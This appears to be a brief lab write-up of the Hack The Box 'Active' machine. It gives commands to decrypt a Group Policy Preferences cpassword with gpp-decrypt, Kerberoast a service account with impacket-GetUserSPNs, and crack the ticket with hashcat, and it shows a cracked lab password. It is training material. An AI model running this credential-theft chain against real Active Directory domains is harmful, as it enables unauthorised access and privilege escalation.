# Active - Group Preference Policy

Group Policies for account management are stored on the Domain Controller in "Groups.xml" files buried in the SYSVOL folder.

**Groups.xml** can store local admin's password.

[image]

**cpassword** is admin pass. Encrypted like AES key MSDN.

[image]

We can decrypt using tool **gpp-decrypt**:

```bash
gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
```

[image]

### Kerberoasting - We have SVC account so now we can Kerberoast for AD

```bash
impacket-GetUserSPNs -dc-ip 10.10.10.100 active.htb/svc_tgs -request
```

[image]

### Password CRACK

Cracked password: **Ticketmaster1968**

```bash
hashcat -m 13100 -a 0 hash /usr/share/wordlists/rockyou.txt
```

[image]

### Exploited!

[image]
